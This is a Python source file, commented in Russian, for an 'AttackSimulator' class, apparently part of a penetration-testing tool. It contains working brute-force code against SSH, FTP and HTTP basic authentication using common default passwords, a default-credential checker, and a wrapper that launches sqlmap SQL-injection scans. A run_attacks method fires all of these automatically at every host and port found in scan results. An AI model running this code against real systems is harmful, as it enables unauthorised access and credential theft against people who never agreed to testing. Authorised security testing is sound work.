import paramiko
import ftplib
import subprocess
import asyncio
import aiohttp
from typing import Dict, List, Optional
import json

class AttackSimulator:
    def __init__(self):
        self.common_passwords = ['admin', '123456', 'password', 'root', 'test', 'admin123']
        self.common_usernames = ['root', 'admin', 'test', 'guest', 'user']
    
    async def ssh_bruteforce(self, host: str, port: int = 22) -> Dict:
        """Асинхронный подбор учетных данных SSH"""
        results = {'success': False, 'credentials': None, 'errors': []}
        
        for username in self.common_usernames:
            for password in self.common_passwords:
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    
                    # Таймаут подключения
                    ssh.connect(host, port=port, username=username, password=password, timeout=10, banner_timeout=10)
                    ssh.close()
                    
                    results['success'] = True
                    results['credentials'] = {'username': username, 'password': password}
                    return results
                    
                except Exception as e:
                    results['errors'].append(str(e))
                    continue
        
        return results
    
    async def ftp_bruteforce(self, host: str, port: int = 21) -> Dict:
        """Подбор учетных данных FTP"""
        results = {'success': False, 'credentials': None, 'errors': []}
        
        for username in self.common_usernames:
            for password in self.common_passwords:
                try:
                    ftp = ftplib.FTP()
                    ftp.connect(host, port, timeout=10)
                    ftp.login(username, password)
                    ftp.quit()
                    
                    results['success'] = True
                    results['credentials'] = {'username': username, 'password': password}
                    return results
                    
                except Exception as e:
                    results['errors'].append(str(e))
                    continue
        
        return results
    
    async def check_http_auth(self, url: str) -> Dict:
        """Проверка HTTP аутентификации"""
        results = {'success': False, 'credentials': None, 'errors': []}
        
        for username in self.common_usernames:
            for password in self.common_passwords:
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.get(url, auth=aiohttp.BasicAuth(username, password)) as response:
                            if response.status != 401:  # Not unauthorized
                                results['success'] = True
                                results['credentials'] = {'username': username, 'password': password}
                                return results
                except Exception as e:
                    results['errors'].append(str(e))
        
        return results
    
    async def run_sqlmap_scan(self, url: str) -> Dict:
        """Запуск sqlmap для проверки SQL инъекций"""
        try:
            # Создаем временный файл для результатов
            import tempfile
            import os
            
            with tempfile.TemporaryDirectory() as tmpdir:
                output_file = os.path.join(tmpdir, 'sqlmap_output.json')
                
                # Запускаем sqlmap
                result = subprocess.run([
                    'sqlmap', '-u', url, '--batch', '--level=1', '--risk=1',
                    '--output-dir', tmpdir, '--flush-session'
                ], capture_output=True, text=True, timeout=300)
                
                # Проверяем результаты
                vulnerable = any(keyword in result.stdout for keyword in [
                    'sql injection', 'injectable', 'vulnerable'
                ])
                
                return {
                    'vulnerable': vulnerable,
                    'details': result.stdout[-1000:],  # Последние 1000 символов
                    'return_code': result.returncode
                }
                
        except subprocess.TimeoutExpired:
            return {'vulnerable': False, 'error': 'SQLMap timeout'}
        except Exception as e:
            return {'vulnerable': False, 'error': str(e)}
    
    async def check_default_credentials(self, host: str, port: int, service: str) -> Dict:
        """Проверка стандартных учетных данных для различных сервисов"""
        
        default_credentials = {
            'ssh': [('root', 'root'), ('admin', 'admin')],
            'ftp': [('anonymous', ''), ('ftp', 'ftp')],
            'http': [('admin', 'admin'), ('admin', 'password')],
            'telnet': [('root', 'root'), ('admin', 'admin')]
        }
        
        credentials = default_credentials.get(service, [])
        results = {'success': False, 'credentials': None, 'errors': []}
        
        for username, password in credentials:
            try:
                if service == 'ssh':
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(host, port=port, username=username, password=password, timeout=5)
                    ssh.close()
                    
                elif service == 'ftp':
                    ftp = ftplib.FTP()
                    ftp.connect(host, port, timeout=5)
                    ftp.login(username, password)
                    ftp.quit()
                
                results['success'] = True
                results['credentials'] = {'username': username, 'password': password}
                return results
                
            except Exception as e:
                results['errors'].append(str(e))
                continue
        
        return results
    
    async def run_attacks(self, scan_data: Dict) -> Dict:
        """Запуск всех атак на основе данных сканирования"""
        attack_results = {}
        
        network_data = scan_data.get('network', {})
        
        for host in network_data.get('hosts', []):
            host_ip = host['ip']
            host_attacks = {}
            
            for port in host.get('ports', []):
                port_num = port['port']
                service = port['service'].lower()
                
                # Атаки на SSH
                if service == 'ssh':
                    host_attacks['ssh_bruteforce'] = await self.ssh_bruteforce(host_ip, port_num)
                    host_attacks['ssh_default_creds'] = await self.check_default_credentials(host_ip, port_num, 'ssh')
                
                # Атаки на FTP
                elif service == 'ftp':
                    host_attacks['ftp_bruteforce'] = await self.ftp_bruteforce(host_ip, port_num)
                    host_attacks['ftp_default_creds'] = await self.check_default_credentials(host_ip, port_num, 'ftp')
                
                # Проверка веб-приложений
                elif service in ['http', 'https']:
                    protocol = 'https' if service == 'https' else 'http'
                    url = f"{protocol}://{host_ip}:{port_num}"
                    
                    host_attacks['http_auth'] = await self.check_http_auth(url)
                    host_attacks['sql_injection'] = await self.run_sqlmap_scan(f"{url}/?id=1")
            
            attack_results[host_ip] = host_attacks
        
        return attack_results
    
    def generate_attack_report(self, attack_results: Dict) -> List[Dict]:
        """Генерация отчета об атаках"""
        findings = []
        
        for host, attacks in attack_results.items():
            for attack_type, result in attacks.items():
                if result.get('success'):
                    findings.append({
                        'host': host,
                        'attack_type': attack_type,
                        'result': result,
                        'severity': 'high' if 'credentials' in result else 'medium'
                    })
        
        return findings